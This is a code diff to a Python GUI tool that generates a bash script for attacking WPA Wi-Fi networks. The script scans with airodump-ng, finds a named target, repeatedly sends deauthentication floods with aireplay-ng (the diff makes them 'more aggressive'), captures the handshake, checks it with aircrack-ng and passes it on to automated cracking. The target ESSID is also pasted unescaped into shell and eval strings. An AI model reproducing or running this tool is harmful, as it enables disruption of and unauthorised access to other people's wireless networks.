@@ -1119,47 +1119,70 @@ class MaximWindow(QMainWindow):
         script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n")
         script.write(f"echo \"[*] Monitor interface: $MON\"\necho ''\n\n")
 
-        # Step 2: Scan ALL networks, then find matching ESSID from CSV
-        # (--essid filter is unreliable: case-sensitive, sometimes empty CSV)
+        # Step 2: Scan ALL networks silently (no ncurses), parse CSV, show clean table
         script.write(f"echo '[2/3] Scanning for networks... (looking for: {essid})'\necho ''\n\n")
         script.write(f"BSSID=''\nCHANNEL=''\nESSID_FOUND=''\n")
         script.write(f"for ATTEMPT in 1 2 3 4 5 6 7 8 9 10; do\n")
         script.write(f"  rm -f {scan_file}-* 2>/dev/null\n")
-        # Scan ALL networks — no --essid filter. Background airodump, let it collect for 20s.
-        script.write(f"  sudo airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 $MON &\n")
+        # Run airodump silently — redirect ALL output so ncurses doesn't corrupt terminal
+        script.write(f"  sudo airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 $MON >/dev/null 2>&1 &\n")
         script.write(f"  SCAN_PID=$!\n")
+        script.write(f"  echo \"  Scanning... (attempt $ATTEMPT/10, 20 seconds)\"\n")
         script.write(f"  sleep 20\n")
-        script.write(f"  sudo kill $SCAN_PID 2>/dev/null; wait $SCAN_PID 2>/dev/null\n\n")
-        # Parse CSV to find our ESSID (case-insensitive match)
-        # airodump CSV fields: BSSID(1), First(2), Last(3), channel(4), Speed(5), Privacy(6),
-        #   Cipher(7), Auth(8), Power(9), #beacons(10), #IV(11), LAN_IP(12), ID-length(13), ESSID(14), Key(15)
+        # Kill airodump properly (sudo process + children)
+        script.write(f"  sudo kill $SCAN_PID 2>/dev/null\n")
+        script.write(f"  sudo killall airodump-ng 2>/dev/null\n")
+        script.write(f"  wait $SCAN_PID 2>/dev/null\n")
+        script.write(f"  sleep 1\n\n")
+        # Parse CSV — use python one-liner for reliable CSV parsing (bash cut breaks on spaces in fields)
         script.write(f"  if [ -f '{scan_file}-01.csv' ]; then\n")
-        # Print ALL networks found as a clean table (full ESSID names, no truncation)
-        script.write(f"    echo '  ┌──────────────────────────────────────────────────────────────────────┐'\n")
-        script.write(f"    echo '  │  ESSID                          BSSID              CH   PWR  ENC    │'\n")
-        script.write(f"    echo '  ├──────────────────────────────────────────────────────────────────────┤'\n")
-        script.write(f"    while IFS= read -r line; do\n")
-        script.write(f"      B=$(echo \"$line\" | cut -d',' -f1 | tr -d ' ')\n")
-        script.write(f"      C=$(echo \"$line\" | cut -d',' -f4 | tr -d ' ')\n")
-        script.write(f"      PWR=$(echo \"$line\" | cut -d',' -f9 | tr -d ' ')\n")
-        script.write(f"      ENC=$(echo \"$line\" | cut -d',' -f6 | tr -d ' ')\n")
-        script.write(f"      E=$(echo \"$line\" | cut -d',' -f14 | sed 's/^ *//' | sed 's/ *$//')\n")
-        script.write(f"      if echo \"$B\" | grep -qE '^([0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}}$'; then\n")
-        script.write(f"        printf '  │  %-32s %-18s %-4s %-4s %-6s│\\n' \"$E\" \"$B\" \"$C\" \"$PWR\" \"$ENC\"\n")
-        # Case-insensitive ESSID match
-        script.write(f"        if echo \"$E\" | grep -qi '^{essid}$'; then\n")
-        script.write(f"          BSSID=$B; CHANNEL=$C; ESSID_FOUND=\"$E\"\n")
-        script.write(f"        fi\n")
-        script.write(f"      fi\n")
-        script.write(f"    done < '{scan_file}-01.csv'\n")
-        script.write(f"    echo '  └──────────────────────────────────────────────────────────────────────┘'\n")
-        script.write(f"    echo ''\n")
+        script.write(f"""    python3 -c "
+import csv, sys
+try:
+    rows = []
+    with open('{scan_file}-01.csv', 'r', errors='ignore') as f:
+        for line in f:
+            parts = [p.strip() for p in line.split(',')]
+            if len(parts) >= 14:
+                bssid = parts[0]
+                if len(bssid) == 17 and bssid.count(':') == 5:
+                    essid = parts[13].strip()
+                    ch = parts[3].strip()
+                    pwr = parts[8].strip()
+                    enc = parts[5].strip()
+                    rows.append((essid, bssid, ch, pwr, enc))
+    if rows:
+        print()
+        print('  NETWORK                          BSSID              CH   PWR  ENC')
+        print('  ' + '─' * 68)
+        for e, b, c, p, enc in rows:
+            marker = ' ◄◄ TARGET' if e.lower() == '{essid}'.lower() else ''
+            print(f'  {{e:<34}} {{b:<18}} {{c:<4}} {{p:<4}} {{enc:<6}}{{marker}}')
+        print('  ' + '─' * 68)
+        print()
+except Exception as ex:
+    print(f'  [!] CSV parse error: {{ex}}')
+" 2>/dev/null\n""")
+        # Now extract BSSID/channel for our target using python
+        script.write(f"""    eval $(python3 -c "
+import sys
+with open('{scan_file}-01.csv', 'r', errors='ignore') as f:
+    for line in f:
+        parts = [p.strip() for p in line.split(',')]
+        if len(parts) >= 14:
+            bssid = parts[0]
+            if len(bssid) == 17 and bssid.count(':') == 5:
+                essid = parts[13].strip()
+                if essid.lower() == '{essid}'.lower():
+                    print(f'BSSID={{bssid}} CHANNEL={{parts[3].strip()}} ESSID_FOUND=\\\"{{essid}}\\\"')
+                    break
+" 2>/dev/null)\n""")
         script.write(f"  fi\n\n")
         script.write(f"  if [ -n \"$BSSID\" ]; then\n")
-        script.write(f"    echo \"[*] TARGET FOUND: $ESSID_FOUND  ($BSSID)  Channel: $CHANNEL\"\n")
+        script.write(f"    echo \"  [*] TARGET FOUND: $ESSID_FOUND  ($BSSID)  Channel: $CHANNEL\"\n")
         script.write(f"    break\n")
         script.write(f"  fi\n")
-        script.write(f"  echo \"[*] Attempt $ATTEMPT/10 — '{essid}' not found yet, retrying...\"\n")
+        script.write(f"  echo \"  [*] '{essid}' not found yet, retrying...\"\n")
         script.write(f"  echo ''\n")
         script.write(f"done\n\n")
         script.write(f"rm -f {scan_file}-* 2>/dev/null\n\n")
@@ -1168,28 +1191,39 @@ class MaximWindow(QMainWindow):
         script.write(f"  echo 'FAILED' > '{signal_file}'\n")
         script.write(f"  echo 'Press Enter to close'\n  read\n  exit 1\nfi\n\n")
 
-        # Step 3: Capture + Deauth
-        script.write(f"echo ''\necho '[3/3] Capturing handshake...'\n")
-        script.write(f"echo '[*] Wait for WPA handshake message, then press Ctrl+C'\necho ''\n\n")
-        script.write(f"(\n  sleep 5\n")
-        script.write(f"  for i in 1 2 3 4 5 6 7 8 9 10; do\n")
-        script.write(f"    sudo aireplay-ng --deauth 10 -a $BSSID $MON 2>/dev/null\n")
-        script.write(f"    sleep 8\n  done\n) &\nDEAUTH_PID=$!\n\n")
+        # Step 3: Capture handshake — run airodump interactively + deauth in background
+        script.write(f"echo ''\necho '[3/3] Capturing handshake on channel $CHANNEL...'\n")
+        script.write(f"echo '    Target: $ESSID_FOUND ($BSSID)'\n")
+        script.write(f"echo '    Deauth packets will be sent automatically.'\n")
+        script.write(f"echo '    When you see \"WPA handshake: $BSSID\" press Ctrl+C'\necho ''\n\n")
+        # Deauth in background — more aggressive: 20 rounds, shorter sleep
+        script.write(f"(\n  sleep 3\n")
+        script.write(f"  for i in $(seq 1 20); do\n")
+        script.write(f"    sudo aireplay-ng --deauth 15 -a $BSSID $MON >/dev/null 2>&1\n")
+        script.write(f"    sleep 5\n  done\n) &\nDEAUTH_PID=$!\n\n")
+        # Interactive airodump — user sees the live capture and WPA handshake message
         script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
-        script.write(f"kill $DEAUTH_PID 2>/dev/null\n\n")
+        script.write(f"kill $DEAUTH_PID 2>/dev/null; wait $DEAUTH_PID 2>/dev/null\n\n")
 
-        # Find .cap file and write path to signal file for the main app
+        # Find .cap file and signal the main app
         script.write(f"CAP_FILE=$(ls -t {essid_dir}/*.cap 2>/dev/null | head -1)\n")
         script.write(f"if [ -n \"$CAP_FILE\" ]; then\n")
-        script.write(f"  echo \"$CAP_FILE\" > '{signal_file}'\n")
-        script.write(f"  echo ''\necho \"[OK] Handshake saved: $CAP_FILE\"\n")
-        script.write(f"  echo '[*] Cracking will start in MAXIM output window...'\n")
+        script.write(f"  echo ''\n  echo \"[OK] Capture file: $CAP_FILE\"\n")
+        # Verify handshake with aircrack-ng
+        script.write(f"  if aircrack-ng \"$CAP_FILE\" 2>&1 | grep -q '[1-9] handshake'; then\n")
+        script.write(f"    echo '[OK] Valid WPA handshake confirmed!'\n")
+        script.write(f"    echo \"$CAP_FILE\" > '{signal_file}'\n")
+        script.write(f"    echo '[*] Cracking will start in MAXIM output window...'\n")
+        script.write(f"  else\n")
+        script.write(f"    echo '[!] No valid handshake in capture file.'\n")
+        script.write(f"    echo '[*] Try again — make sure a client is connected to the network.'\n")
+        script.write(f"    echo 'NO_CAP' > '{signal_file}'\n")
+        script.write(f"  fi\n")
         script.write(f"else\n")
         script.write(f"  echo 'NO_CAP' > '{signal_file}'\n")
-        script.write(f"  echo '[!] No .cap file — handshake may not have been captured.'\n")
+        script.write(f"  echo '[!] No .cap file created.'\n")
         script.write(f"fi\n\n")
-        script.write(f"echo ''\necho 'You can close this terminal.'\n")
-        script.write(f"sleep 3\n")
+        script.write(f"echo ''\necho 'Press Enter to close.'\nread\n")
 
         script.close()
         os.chmod(script.name, 0o755)
